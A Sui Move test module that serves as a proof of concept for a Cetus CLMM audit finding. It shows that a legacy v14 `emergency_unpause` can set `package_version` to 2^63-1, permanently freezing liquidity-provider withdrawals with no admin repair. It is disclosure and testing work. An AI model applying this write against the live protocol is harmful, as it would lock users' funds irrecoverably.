#[test_only]
module cetus_clmm::emergency_unpause_legacy_bypass_tests;

// PoC for: "legacy packages keep the un-capped `emergency_unpause`, so the
// package-version cap added in v15 (PR #6) does not remove the write primitive,
// and any resulting `package_version >= 2^63 - 1` is permanent."
//
// The v15 source can only *reject* the write (mode 0). The write itself is
// performed by the still-callable v14 package, whose `emergency_unpause`
// asserts only `version >= before_version` and then executes
// `config.package_version = version`
// (CetusProtocol/cetus-contracts, branch `version-14`, config.move:539-554).
// `config::update_package_version_for_test` (config.move:647) is that same
// single field write, so modes 1-3 replay the legacy call exactly.

use cetus_clmm::{config, pool, tick_math};
use cetus_clmm::pool_tests::{CoinA, CoinB, nt, pt};
use integer_mate::i32;
use sui::{balance, clock, coin, transfer};
use std::string;

/// 2^63 - 1. The smallest value that is an *irrecoverable* brick:
/// `update_package_version` requires `version > old && version < 2^63`, so no
/// u64 can raise it again, and `checked_package_version`
/// (`VERSION >= config.package_version`) fails for every deployed package.
const BRICK_VERSION: u64 = 0x7FFFFFFFFFFFFFFF;

fun exercise(mode: u8) {
    let mut ctx = tx_context::dummy();
    let clk = clock::create_for_testing(&mut ctx);
    let (cap, mut config) = config::new_global_config_for_test(&mut ctx, 2000);
    // v15 keeps the legacy bit 5 as ACL_EMERGENCY_UNPAUSE and moves pause to bit 6.
    config::add_role(&cap, &mut config, ctx.sender(), 5); // ACL_EMERGENCY_UNPAUSE
    config::add_role(&cap, &mut config, ctx.sender(), 6); // ACL_EMERGENCY_PAUSE

    let mut pool = pool::new_for_test<CoinA, CoinB>(
        200,
        tick_math::get_sqrt_price_at_tick(i32::zero()),
        10000,
        string::utf8(b""),
        0,
        &clk,
        &mut ctx,
    );
    let mut pos = pool::open_position(
        &config,
        &mut pool,
        nt(1800).as_u32(),
        pt(1800).as_u32(),
        &mut ctx,
    );
    let receipt = pool::add_liquidity(&config, &mut pool, &mut pos, 10000000000, &clk);
    let (amount_a, amount_b) = pool::add_liquidity_pay_amount(&receipt);
    assert!(amount_a > 0 && amount_b > 0, 100);
    pool::repay_add_liquidity(
        &config,
        &mut pool,
        balance::create_for_testing<CoinA>(amount_a),
        balance::create_for_testing<CoinB>(amount_b),
        receipt,
    );

    if (mode == 0) {
        // The cap lives only in v15: `version <= package_version() == VERSION == 15`.
        // The v14 package has no such assert, so it accepts BRICK_VERSION here.
        config::emergency_pause(&mut config, &ctx);
        config::emergency_unpause(&mut config, BRICK_VERSION, &ctx);
    } else if (mode == 1) {
        // Replay of the legacy (v14) `emergency_unpause(BRICK_VERSION)` write.
        config::update_package_version_for_test(&cap, &mut config, BRICK_VERSION);
        // Live LP funds are now unreachable: every money path starts with
        // `checked_package_version`, so this aborts before any balance exists.
        let (balance_a, balance_b) = pool::remove_liquidity(
            &config,
            &mut pool,
            &mut pos,
            1000000000,
            &clk,
        );
        transfer::public_transfer(coin::from_balance(balance_a, &mut ctx), ctx.sender());
        transfer::public_transfer(coin::from_balance(balance_b, &mut ctx), ctx.sender());
    } else if (mode == 2) {
        // No repair through the AdminCap: `2^63 - 1 < version < 2^63` admits no u64.
        config::update_package_version_for_test(&cap, &mut config, BRICK_VERSION);
        config::update_package_version(&cap, &mut config, 15);
    } else {
        // No repair through the emergency path either: `before_version` is the
        // brick value, so `version >= before_version && version <= 15` is empty.
        config::update_package_version_for_test(&cap, &mut config, BRICK_VERSION);
        config::emergency_pause(&mut config, &ctx);
        config::emergency_unpause(&mut config, 15, &ctx);
    };

    transfer::public_transfer(pos, ctx.sender());
    transfer::public_transfer(cap, ctx.sender());
    transfer::public_share_object(pool);
    transfer::public_share_object(config);
    clk.destroy_for_testing();
}

/// v15's own path is correctly capped (this is the only place the cap exists).
#[test]
#[expected_failure(abort_code = config::EInvalidPackageVersion, location = cetus_clmm::config)]
fun test_v15_cap_rejects_brick_version() {
    exercise(0);
}

/// LPs can never withdraw again once the version is poisoned by the legacy write.
#[test]
#[expected_failure(abort_code = config::EPackageVersionDeprecate, location = cetus_clmm::config)]
fun test_bricked_version_freezes_lp_withdrawal() {
    exercise(1);
}

/// The AdminCap cannot lower `package_version`, so there is no admin repair.
#[test]
#[expected_failure(abort_code = config::EInvalidPackageVersion, location = cetus_clmm::config)]
fun test_bricked_version_cannot_be_repaired_by_admin_cap() {
    exercise(2);
}

/// Pause (no version gate) followed by a capped unpause cannot repair it either.
#[test]
#[expected_failure(abort_code = config::EInvalidPackageVersion, location = cetus_clmm::config)]
fun test_bricked_version_cannot_be_repaired_by_emergency_unpause() {
    exercise(3);
}
